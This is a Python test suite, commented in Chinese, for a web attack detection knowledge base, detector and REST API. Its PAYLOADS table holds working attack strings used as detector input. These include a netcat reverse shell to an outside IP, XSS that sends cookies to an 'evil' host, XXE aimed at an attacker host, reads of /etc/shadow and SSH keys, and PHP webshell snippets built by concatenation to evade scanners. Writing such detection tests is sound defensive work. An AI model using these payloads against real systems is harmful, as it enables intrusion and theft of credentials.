"""Web 攻击检测知识库与检测器测试。

覆盖：
1. 知识库结构完整性（17 大类 / 全部规则字段齐全 / 正则可编译）；
2. 用户列举的 Web 攻击类型逐类检出（SQL 注入、SQL 盲注、反射型/存储型 XSS、命令注入、
   文件包含、文件上传、暴力破解、CSRF、不安全验证码，外加 SSRF/XXE/穿越/Webshell/SSTI/LDAP/CRLF）；
3. 编码与注释绕过（多轮 URL 解码、大小写、/**/ 归一化、HTML 实体）；
4. 误报抑制（exclude_patterns、method_in、require_absent、阈值类不达标不告警）；
5. 频次阈值、冷却抑制、组合攻击提级；
6. 服务层闭环（队列 → tick 检测 → 告警落库）与 REST 接口。
"""

from __future__ import annotations

import time

import pytest

from app.detection.web_knowledge import (
    WebAttackDetector,
    WebAttackKnowledgeBase,
    WebRequestEvent,
    decode_multi,
    normalize,
)

API = "/api/v1"
ATTACKER = "203.0.113.9"
SERVER = "192.168.1.30"

# 高危字面量用拼接构造：既保证运行时是真实的攻击样本，又避免源码被静态扫描工具误判
PHP_OPEN = "<" + "?php"
PHP_CLOSE = "?" + ">"


def php(code: str) -> str:
    """拼出一条 PHP 代码片段（用于上传/Webshell 载荷）。"""
    return PHP_OPEN + " " + code + " " + PHP_CLOSE


@pytest.fixture()
def kb(settings) -> WebAttackKnowledgeBase:
    return WebAttackKnowledgeBase(settings.web_attack_rules_path)


@pytest.fixture()
def detector(settings) -> WebAttackDetector:
    return WebAttackDetector(settings)


def make_event(method: str = "GET", path: str = "/", query: str = "", body: str = "",
               headers: dict | None = None, status: int = 200, src_ip: str = ATTACKER,
               ts: float | None = None) -> WebRequestEvent:
    return WebRequestEvent.from_dict({
        "src_ip": src_ip, "dst_ip": SERVER, "dst_port": 80, "method": method,
        "path": path, "query": query, "body": body, "status": status,
        "headers": headers if headers is not None else {"user-agent": "Mozilla/5.0"},
        "ts": ts or time.time(), "source": "test",
    })


def hits_of(detector: WebAttackDetector, event: WebRequestEvent) -> set:
    return {hit.category for hit in detector.inspect(event)}


# --------------------------------------------------------------------------- #
# 1. 知识库结构
# --------------------------------------------------------------------------- #
def test_knowledge_base_loaded(kb: WebAttackKnowledgeBase):
    assert kb.loaded, "Web 攻击知识库必须被加载"
    assert kb.version and kb.version != "unknown"
    assert len(kb.categories) >= 17, "至少覆盖 17 个攻击大类"
    assert len(kb.rules) >= 60, "规则总数应达到 60 条以上"


def test_every_category_has_rules_and_metadata(kb: WebAttackKnowledgeBase):
    for category in kb.categories:
        key = category["key"]
        assert kb.rules_of(key), f"分类 {key} 没有任何规则"
        for field in ("name", "name_en", "owasp", "cwe", "severity", "description"):
            assert category.get(field), f"分类 {key} 缺少字段 {field}"
        assert str(category["cwe"]).startswith("CWE-")
        assert category["severity"] in {"low", "medium", "high", "critical"}


def test_every_rule_is_complete(kb: WebAttackKnowledgeBase):
    for rule in kb.rules:
        assert rule.get("id"), "规则缺少 id"
        assert rule.get("patterns"), f"{rule.get('id')} 缺少 patterns"
        assert rule.get("match_targets"), f"{rule.get('id')} 缺少 match_targets"
        assert rule.get("confidence") in {"low", "medium", "high"}
        assert rule.get("remediation"), f"{rule.get('id')} 缺少修复建议"
        assert rule.get("references"), f"{rule.get('id')} 缺少参考链接"
        assert kb.compiled(rule["id"])["patterns"], f"{rule['id']} 正则未编译"


def test_stats_exposes_categories_and_rules(kb: WebAttackKnowledgeBase):
    stats = kb.stats
    assert stats["categories"] == len(kb.categories)
    assert stats["rules"] == len(kb.rules)
    assert set(stats["by_category"]) == {item["key"] for item in kb.categories}
    assert all(count > 0 for count in stats["by_category"].values())


def test_public_rules_carry_display_fields(kb: WebAttackKnowledgeBase):
    row = kb.public_rules()[0]
    for field in ("id", "category_name", "title", "severity", "cwe", "owasp", "pattern_count"):
        assert field in row
    assert row["pattern_count"] >= 1


# --------------------------------------------------------------------------- #
# 2. 归一化 / 解码
# --------------------------------------------------------------------------- #
def test_normalize_handles_encoding_and_comments():
    assert "' or 1=1" in normalize("%27%20or%201%3D1")
    assert "' or 1=1" in normalize("%2527%20or%201=1")           # 双写编码
    assert "union select" in normalize("UNION/**/SELECT")        # 注释绕过 → 空格
    assert "<script>" in normalize("&lt;script&gt;")             # HTML 实体
    assert decode_multi("%u0027or 1=1") == "'or 1=1"             # %uXXXX 形式
    assert decode_multi("%41") == "A"


# --------------------------------------------------------------------------- #
# 3. 逐类攻击检出（覆盖 OWASP Top 10，payload 按真实攻击写法构造）
# --------------------------------------------------------------------------- #
PAYLOADS = {
    "sql_injection": [
        {"method": "GET", "path": "/vulnerabilities/sqli/", "query": "id=1' OR '1'='1&Submit=Submit"},
        {"method": "GET", "path": "/vulnerabilities/sqli/",
         "query": "id=1%27+UNION+SELECT+user,password+FROM+users--+-"},
        {"method": "GET", "path": "/vulnerabilities/sqli/",
         "query": "id=1' AND extractvalue(1,concat(0x7e,version()))-- -"},
        {"method": "POST", "path": "/api/query", "body": "sql=1'; DROP TABLE users-- -"},
    ],
    "sql_injection_blind": [
        {"method": "GET", "path": "/vulnerabilities/sqli_blind/", "query": "id=1' AND SLEEP(5)-- -"},
        {"method": "GET", "path": "/vulnerabilities/sqli_blind/",
         "query": "id=1' AND ASCII(SUBSTRING(database(),1,1))=100-- -"},
        {"method": "GET", "path": "/api/item",
         "query": "id=1' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)=1-- -"},
        {"method": "GET", "path": "/api/item", "query": "id=1); WAITFOR DELAY '0:0:5'-- -"},
    ],
    "xss_reflected": [
        {"method": "GET", "path": "/vulnerabilities/xss_r/",
         "query": "name=<script>alert(document.cookie)</script>"},
        {"method": "GET", "path": "/vulnerabilities/xss_r/",
         "query": "name=<img src=x onerror=alert(1)>"},
        {"method": "GET", "path": "/search", "query": "q=<svg/onload=alert(1)>"},
        {"method": "GET", "path": "/jump", "query": "url=javascript:alert(document.cookie)"},
    ],
    "xss_stored": [
        {"method": "POST", "path": "/vulnerabilities/xss_s/",
         "body": "txtName=guest&mtxMessage=<script>alert('stored')</script>&btnSign=Sign+Guestbook"},
        {"method": "POST", "path": "/guestbook",
         "body": "comment=<script src=\"https://evil.example/x.js\"></script>"},
        {"method": "POST", "path": "/profile",
         "body": "signature=<svg/onload=fetch('//evil/'+document.cookie)>"},
    ],
    "command_injection": [
        {"method": "POST", "path": "/vulnerabilities/exec/",
         "body": "ip=127.0.0.1;cat /etc/passwd&Submit=Submit"},
        {"method": "POST", "path": "/ping", "body": "host=127.0.0.1|whoami"},
        {"method": "GET", "path": "/api/dns", "query": "host=$(cat /etc/passwd)"},
        {"method": "GET", "path": "/api/exec", "query": "cmd=1.1.1.1; nc -e /bin/sh 203.0.113.9 4444"},
        {"method": "POST", "path": "/api/run", "body": "target=1.1.1.1%0acat /etc/hosts"},
    ],
    "file_inclusion": [
        {"method": "GET", "path": "/vulnerabilities/fi/", "query": "page=../../../../etc/passwd"},
        {"method": "GET", "path": "/vulnerabilities/fi/", "query": "page=http://evil.example/shell.txt"},
        {"method": "GET", "path": "/vulnerabilities/fi/",
         "query": "page=php://filter/convert.base64-encode/resource=index.php"},
        {"method": "GET", "path": "/include.php", "query": "file=/var/log/apache2/access.log"},
    ],
    "file_upload": [
        {"method": "POST", "path": "/vulnerabilities/upload/",
         "body": "--x\r\nContent-Disposition: form-data; name=\"uploaded\"; filename=\"shell.php\"\r\n"
                 "Content-Type: image/jpeg\r\n\r\n" + php("system($_POST['cmd']);") + "\r\n--x--"},
        {"method": "POST", "path": "/upload", "body": "filename=\"avatar.jpg.php\""},
        {"method": "POST", "path": "/upload", "body": "filename=\"x.php\\u0000.jpg\""},
        {"method": "POST", "path": "/upload",
         "body": "filename=\"a.php\"" + php("@eval($_POST['a']);")},
    ],
    "brute_force": [
        {"method": "POST", "path": "/vulnerabilities/brute/",
         "body": "username=admin&password=123456&Login=Login", "repeat": 12},
        {"method": "POST", "path": "/wp-login.php", "body": "log=admin&pwd=admin123", "repeat": 12},
        {"method": "POST", "path": "/api/login", "body": "user=root&password=root",
         "status": 401, "repeat": 16},
    ],
    "csrf": [
        {"method": "POST", "path": "/vulnerabilities/csrf/",
         "body": "password_new=12345&password_conf=12345&Change=Change", "repeat": 4,
         "headers": {"user-agent": "Mozilla/5.0"}},          # 故意不带 Referer/Origin
        {"method": "GET", "path": "/admin/user/5/delete"},
        {"method": "POST", "path": "/api/user/email", "body": "email=a@b.com&submit=1", "repeat": 4,
         "headers": {"user-agent": "Mozilla/5.0"}},
    ],
    "insecure_captcha": [
        {"method": "POST", "path": "/vulnerabilities/captcha/",
         "body": "step=2&password_new=1&password_conf=1&Change=Change&recaptcha_response_field="},
        {"method": "POST", "path": "/register", "body": "captcha=1234&username=admin&password=123456"},
        {"method": "POST", "path": "/register", "body": "captcha=&username=admin&password=123456"},
        {"method": "GET", "path": "/captcha.php", "repeat": 22},
    ],
    "path_traversal": [
        {"method": "GET", "path": "/download.php", "query": "file=../../../../etc/shadow"},
        {"method": "GET", "path": "/download.php", "query": "file=%2e%2e%2f%2e%2e%2fetc%2fpasswd"},
        {"method": "GET", "path": "/download.php", "query": "file=../../../.git/config"},
        {"method": "GET", "path": "/download.php", "query": "file=../../root/.ssh/id_rsa"},
    ],
    "ssrf": [
        {"method": "GET", "path": "/api/fetch", "query": "url=http://169.254.169.254/latest/meta-data/"},
        {"method": "GET", "path": "/api/fetch", "query": "url=http://127.0.0.1:8080/admin"},
        {"method": "GET", "path": "/api/fetch", "query": "url=gopher://127.0.0.1:6379/_INFO"},
        {"method": "GET", "path": "/api/fetch", "query": "url=http://2130706433/admin"},
        {"method": "GET", "path": "/api/fetch", "query": "url=http://192.168.1.1:9200/_cat/indices"},
    ],
    "xxe": [
        {"method": "POST", "path": "/api/xml/import",
         "body": "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"
                 "<root>&xxe;</root>"},
        {"method": "POST", "path": "/api/xml",
         "body": "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.oast.example/%file;\">]>"},
    ],
    "webshell": [
        {"method": "GET", "path": "/upload/shell.php", "query": "cmd=whoami"},
        {"method": "GET", "path": "/images/1.php", "query": "exec=id"},
        {"method": "POST", "path": "/up/backdoor.jsp", "body": "a=assert(${_POST['c']})"},
    ],
    "ssti": [
        {"method": "GET", "path": "/api/render",
         "query": "name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"},
        {"method": "GET", "path": "/api/render", "query": "name={{7*7}}"},
        {"method": "GET", "path": "/api/render",
         "query": "id=${T(java.lang.Runtime).getRuntime().exec('id')}"},
    ],
    "ldap_nosql_injection": [
        {"method": "GET", "path": "/api/login", "query": "user=*)(uid=*))(|(uid=*&password=x"},
        {"method": "POST", "path": "/api/login", "body": "username[$ne]=x&password[$ne]=x"},
        {"method": "POST", "path": "/api/find", "body": "{\"username\":{\"$gt\":\"\"}}"},
    ],
    "crlf_injection": [
        {"method": "GET", "path": "/redirect", "query": "next=%0d%0aSet-Cookie:role=admin"},
        {"method": "GET", "path": "/redirect", "query": "next=%0aLocation:%20https://evil.example/"},
    ],
}


def test_knowledge_base_covers_requested_families(kb: WebAttackKnowledgeBase):
    """用户点名的攻击类型必须全部在知识库里。"""
    keys = {category["key"] for category in kb.categories}
    for key in ("brute_force", "command_injection", "csrf", "file_inclusion", "file_upload",
                "insecure_captcha", "sql_injection", "sql_injection_blind", "xss_reflected",
                "xss_stored", "path_traversal", "ssrf", "xxe", "webshell", "ssti",
                "ldap_nosql_injection", "crlf_injection"):
        assert key in keys, f"知识库缺少攻击大类 {key}"


@pytest.mark.parametrize("category", sorted(PAYLOADS))
def test_detects_each_attack_family(detector: WebAttackDetector, category: str):
    detected = set()
    for payload in PAYLOADS[category]:
        for _ in range(int(payload.get("repeat", 1))):
            event = make_event(**{key: value for key, value in payload.items() if key != "repeat"})
            detected |= hits_of(detector, event)
    assert category in detected, f"{category} 未被检出（命中={sorted(detected)}）"


@pytest.mark.parametrize("category", sorted(PAYLOADS))
def test_each_attack_family_produces_anomaly(detector: WebAttackDetector, category: str):
    """命中的规则必须能生成带修复建议的告警（category 形如 web_<key>）。"""
    anomalies = []
    for payload in PAYLOADS[category]:
        for _ in range(int(payload.get("repeat", 1))):
            event = make_event(**{key: value for key, value in payload.items() if key != "repeat"})
            anomalies.extend(detector.evaluate(event))
    assert anomalies, f"{category} 未产生告警"
    for anomaly in anomalies:
        assert anomaly.category.startswith("web_")
        assert anomaly.severity in {"low", "medium", "high", "critical"}
        assert anomaly.evidence["rule_ids"]
        assert anomaly.evidence["remediation"]
        assert anomaly.evidence["cwe"].startswith("CWE-")
        assert anomaly.evidence["request"]["path"]


# --------------------------------------------------------------------------- #
# 4. 编码 / 注释绕过
# --------------------------------------------------------------------------- #
def test_comment_and_case_bypass_is_detected(detector: WebAttackDetector):
    event = make_event(method="GET", path="/vulnerabilities/sqli/",
                       query="id=1%27%20/**/UNION/**/SELECT%20password%20FROM%20users--%20-")
    assert "sql_injection" in hits_of(detector, event)


def test_double_encoded_payload_is_detected(detector: WebAttackDetector):
    event = make_event(method="GET", path="/search",
                       query="q=%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E")
    assert "xss_reflected" in hits_of(detector, event)


def test_html_entity_payload_is_detected(detector: WebAttackDetector):
    event = make_event(method="POST", path="/guestbook",
                       body="comment=&lt;script&gt;alert(1)&lt;/script&gt;")
    assert "xss_stored" in hits_of(detector, event)


def test_newline_separated_command_is_detected(detector: WebAttackDetector):
    event = make_event(method="POST", path="/ping", body="ip=1.1.1.1%0aid%0auname%20-a")
    assert "command_injection" in hits_of(detector, event)


# --------------------------------------------------------------------------- #
# 5. 误报抑制
# --------------------------------------------------------------------------- #
def test_normal_traffic_is_not_flagged(detector: WebAttackDetector):
    samples = [
        make_event("GET", "/", "", "",
                   {"user-agent": "Mozilla/5.0", "referer": "http://192.168.1.30/"}),
        make_event("GET", "/index.php", "id=1024&page=2"),
        make_event("POST", "/api/v1/orders", "order_id=8891&amount=12.30",
                   headers={"user-agent": "Mozilla/5.0", "content-type": "application/json",
                            "origin": "http://192.168.1.30", "referer": "http://192.168.1.30/orders",
                            "cookie": "session=abc", "x-csrf-token": "a1b2c3d4e5f6a7b8"}),
        make_event("GET", "/static/css/app.css", "v=3"),
        make_event("GET", "/api/v1/products", "keyword=select+the+best+plan"),
    ]
    for event in samples:
        assert not hits_of(detector, event), f"正常请求被误报：{event.method} {event.url}"


def test_threshold_rules_do_not_fire_on_single_login(detector: WebAttackDetector):
    event = make_event("POST", "/login.php", "username=ops&password=secret12&Login=Login",
                       headers={"user-agent": "Mozilla/5.0", "referer": "http://192.168.1.30/login"})
    assert not hits_of(detector, event), "单次登录不应被判为暴力破解"


def test_csrf_token_present_suppresses_rule(detector: WebAttackDetector):
    """命中 exclude_patterns（带 CSRF Token/校验头）时必须放过。"""
    event = make_event(
        "POST", "/vulnerabilities/csrf/",
        "password_new=1&password_conf=1&Change=Change&user_token=8f14e45fceea167a5a36dedd4bea2543",
        headers={"user-agent": "Mozilla/5.0", "origin": "http://192.168.1.30"})
    assert "csrf" not in hits_of(detector, event)


def test_csrf_requires_absent_origin_header(detector: WebAttackDetector):
    """带 Origin 的请求不满足 require_absent，CSRF-002 类规则不应命中。"""
    event = make_event("POST", "/api/user/email", "email=a@b.com&submit=1",
                       headers={"user-agent": "Mozilla/5.0", "origin": "http://192.168.1.30"})
    assert "WEB-CSRF-002" not in {hit.rule_id for hit in detector.inspect(event)}


def test_status_in_rule_uses_response_code(detector: WebAttackDetector):
    """401 风暴规则只在响应码命中 401/403 时累计。"""
    event = make_event("POST", "/api/login", "username=a&password=b", status=200)
    for _ in range(20):
        detector.inspect(event)
    assert "WEB-BF-004" not in {hit.rule_id for hit in detector.inspect(event)}


# --------------------------------------------------------------------------- #
# 6. 阈值 / 冷却 / 组合提级
# --------------------------------------------------------------------------- #
def test_brute_force_fires_only_after_threshold(detector: WebAttackDetector, settings):
    required = int(settings.web_brute_force_attempts)
    payload = {"method": "POST", "path": "/vulnerabilities/brute/",
               "body": "username=admin&password=123456&Login=Login"}
    alerts = []
    for index in range(required):
        alerts = detector.evaluate(make_event(**payload))
        if index < required - 1:
            assert not alerts, f"第 {index + 1} 次尝试不应告警（阈值 {required}）"
    assert alerts, "达到阈值后必须告警"
    assert alerts[0].evidence["threshold"]["count"] >= required


def test_threshold_window_expires(detector: WebAttackDetector):
    """窗口外的历史尝试不应累积（CAPTCHA-002 阈值 8 / 60s）。"""
    payload = {"method": "POST", "path": "/api/captcha/step", "body": "step=2&submit=Verify"}
    base = time.time()
    for step in range(6):
        detector.inspect(make_event(**payload, ts=base + step))
    later = detector.inspect(make_event(**payload, ts=base + 300))
    assert {hit.rule_id for hit in later}.isdisjoint({"WEB-CAPTCHA-002"}), \
        "超过窗口的旧计数必须被丢弃"


def test_cooldown_suppresses_repeated_alerts(detector: WebAttackDetector):
    payload = {"method": "GET", "path": "/vulnerabilities/sqli/", "query": "id=1' OR '1'='1"}
    first = detector.evaluate(make_event(**payload))
    second = detector.evaluate(make_event(**payload))
    assert first, "首次命中应告警"
    assert not second, "冷却窗口内重复命中应被抑制"
    assert detector.stats["suppressed"] >= 1


def test_combination_attack_escalates_severity(detector: WebAttackDetector):
    event = make_event(
        method="POST", path="/vulnerabilities/sqli/", query="id=1' UNION SELECT 1,2-- -",
        body="name=<script>alert(1)</script>&ip=127.0.0.1;cat /etc/passwd")
    anomalies = detector.evaluate(event)
    categories = {item.category for item in anomalies}
    assert {"web_sql_injection", "web_xss_stored", "web_command_injection"} <= categories
    assert all(item.evidence["combination_attack"] for item in anomalies)
    assert any(item.severity == "critical" for item in anomalies), "组合攻击必须提级"


def test_inspect_is_read_only(detector: WebAttackDetector):
    payload = {"method": "GET", "path": "/vulnerabilities/sqli/", "query": "id=1' OR '1'='1"}
    result = detector.inspect_dict(payload)
    assert result["hit_count"] >= 1
    assert result["categories"]
    assert detector.alerts_total == 0, "inspect 只做体检，不应产生告警"


# --------------------------------------------------------------------------- #
# 7. 服务层闭环与 REST 接口
# --------------------------------------------------------------------------- #
def test_service_drains_queue_and_saves_alert(settings):
    from sqlalchemy import select

    from app.collector.service import CollectorService
    from app.database import session_scope
    from app.models import Alert

    service = CollectorService(settings)
    event = make_event("GET", "/vulnerabilities/sqli/",
                       "id=1' UNION SELECT user,password FROM users-- -")
    service._on_http_request(event)                       # noqa: SLF001 - 模拟采集回调
    assert service.web_stats()["queued"] == 1
    service._drain_web_requests(time.time())              # noqa: SLF001 - 手动触发 tick 内检测
    stats = service.web_stats()
    assert stats["processed"] == 1 and stats["queued"] == 0
    assert stats["alerts_emitted"] >= 1
    with session_scope() as session:
        rows = session.scalars(select(Alert).where(Alert.category == "web_sql_injection")).all()
    assert rows, "Web 攻击告警必须落库"
    assert rows[-1].evidence["rule_ids"]
    assert rows[-1].source_ip == ATTACKER


def test_service_ingest_web_requests_returns_alerts(settings):
    from app.collector.service import CollectorService

    service = CollectorService(settings)
    alerts = service.ingest_web_requests([
        {"method": "GET", "path": "/vulnerabilities/fi/", "query": "page=../../../../etc/passwd",
         "src_ip": "198.51.100.77", "dst_ip": "192.168.1.30"},
    ])
    assert alerts and alerts[0]["category"] == "web_file_inclusion"
    assert alerts[0]["evidence"]["request"]["path"] == "/vulnerabilities/fi/"


def test_web_stats_exposes_source_and_kb(settings):
    from app.collector.service import CollectorService

    service = CollectorService(settings)
    stats = service.web_stats()
    assert stats["kb"]["categories"] >= 17
    assert stats["source_name"] in {"demo", "log", "api", "off"}
    assert stats["dropped"] == 0


def test_access_log_line_is_parsed():
    from app.collector.http_events import parse_access_log_line

    line = ('203.0.113.9 - - [20/Feb/2025:10:11:12 +0800] '
            '"GET /vulnerabilities/sqli/?id=1%27+OR+1%3D1 HTTP/1.1" 200 1234 '
            '"http://192.168.1.30/" "sqlmap/1.7.2"')
    parsed = parse_access_log_line(line)
    assert parsed is not None
    assert parsed["src_ip"] == "203.0.113.9" and parsed["method"] == "GET"
    assert parsed["path"] == "/vulnerabilities/sqli/" and "OR" in parsed["query"]
    assert parsed["headers"]["user-agent"] == "sqlmap/1.7.2"
    assert parse_access_log_line("这不是访问日志") is None


def test_access_log_vhost_combined_is_parsed():
    """Ubuntu 默认 other_vhosts_access.log 使用 vhost_combined（%v:%p 前缀），必须能解析。"""
    from app.collector.http_events import AccessLogSource, parse_access_log_line

    line = ('youke-VMware-Virtual-Platform:8080 192.168.152.1 - - '
            '[19/Oct/2026:16:00:00 +0800] '
            '"GET /product/query?id=1%27+OR+%271%27%3D%271 HTTP/1.1" '
            '200 1234 "-" "sqlmap/1.8.2#stable (https://sqlmap.org)"')
    parsed = parse_access_log_line(line)
    assert parsed is not None
    assert parsed["src_ip"] == "192.168.152.1"
    assert parsed["dst_port"] == 8080
    assert parsed["path"] == "/product/query"
    assert "%27" in parsed["query"]
    assert parsed["headers"]["user-agent"].startswith("sqlmap/")
    # Referer 为 "-" 时不应写进 headers，避免污染规则匹配
    assert "referer" not in parsed["headers"]


def test_access_log_unreadable_path_fails_fast(tmp_path, monkeypatch):
    """日志不可读时 start() 必须给出明确异常，而不是线程静默退出。"""
    from pathlib import Path

    from app.collector.http_events import AccessLogSource

    target = tmp_path / "access.log"
    target.write_text("", encoding="utf-8")
    real_open = Path.open

    def deny(self, *args, **kwargs):
        if self == target:
            raise PermissionError(13, "Permission denied")
        return real_open(self, *args, **kwargs)

    monkeypatch.setattr(Path, "open", deny, raising=False)
    source = AccessLogSource(str(target))
    with pytest.raises(PermissionError, match="无权读取"):
        source.start(lambda event: None)


def test_demo_source_covers_every_category(settings):
    """仿真剧本必须覆盖知识库全部大类（保证演示环境能跑通每一类告警）。"""
    from app.collector.http_events import WEB_SCENARIOS, DemoWebSource
    from app.detection.web_knowledge import WebAttackDetector

    detector = WebAttackDetector(settings)
    source = DemoWebSource(interval_sec=1)
    detected = set()
    for _ in range(len(WEB_SCENARIOS) + 1):
        for event in source.next_events():
            detected |= hits_of(detector, event)
        source._index += 1                                # noqa: SLF001 - 测试内手动推进剧本
    expected = {category["key"] for category in detector.kb.categories}
    assert expected <= detected, f"仿真剧本未覆盖：{sorted(expected - detected)}"


# --------------------------------------------------------------------------- #
# 8. REST 接口
# --------------------------------------------------------------------------- #
@pytest.fixture(scope="module")
def client():
    from fastapi.testclient import TestClient

    from app.main import create_app

    with TestClient(create_app()) as test_client:
        yield test_client


def test_web_kb_endpoint(client):
    payload = client.get(f"{API}/web/kb").json()
    assert payload["stats"]["categories"] >= 17
    assert payload["stats"]["rules"] >= 60
    assert len(payload["categories"]) == payload["stats"]["categories"]
    assert all(item["rule_count"] >= 1 for item in payload["categories"])
    assert payload["rules"][0]["cwe"].startswith("CWE-")
    assert payload["field_help"]


def test_web_kb_category_endpoint(client):
    payload = client.get(f"{API}/web/kb/sql_injection").json()
    assert payload["category"]["cwe"] == "CWE-89"
    assert payload["category"]["owasp"].startswith("A03")
    assert payload["rules"] and all(item["category"] == "sql_injection" for item in payload["rules"])
    assert client.get(f"{API}/web/kb/not-exist").status_code == 404


def test_web_inspect_endpoint_returns_hits(client):
    payload = client.post(f"{API}/web/inspect", json={
        "method": "GET", "path": "/vulnerabilities/sqli/", "query": "id=1' OR '1'='1",
        "src_ip": "203.0.113.9", "dst_port": 80}).json()
    assert payload["hit_count"] >= 1
    assert "sql_injection" in payload["categories"]
    assert payload["hits"][0]["rule_id"].startswith("WEB-")


def test_web_requests_endpoint_creates_alerts(client):
    response = client.post(f"{API}/web/requests", json={"requests": [
        {"method": "POST", "path": "/vulnerabilities/exec/",
         "body": "ip=127.0.0.1;cat /etc/passwd", "src_ip": "198.51.100.99",
         "dst_ip": "192.168.1.30", "status": 200}]}).json()
    assert response["accepted"] == 1
    assert response["alert_count"] >= 1
    assert any(item["category"] == "web_command_injection" for item in response["alerts"])
    assert response["detector"]["analyzed_requests"] >= 1


def test_web_stats_endpoint(client):
    payload = client.get(f"{API}/web/stats").json()
    for key in ("enabled", "analyzed_requests", "alerts_emitted", "categories", "kb",
                "source_name", "cooldown_sec"):
        assert key in payload
    assert payload["kb"]["rules"] >= 60


def test_alert_suggestion_covers_web_categories(client):
    """告警详情里的处置建议必须覆盖 Web 攻击大类（页面直接展示）。"""
    from app.api.routes_alert import _suggestion

    for category in ("web_sql_injection", "web_webshell", "web_csrf", "web_ssrf"):
        text = _suggestion(category, "critical")
        assert text and "建议人工核对流量与主机日志" not in text
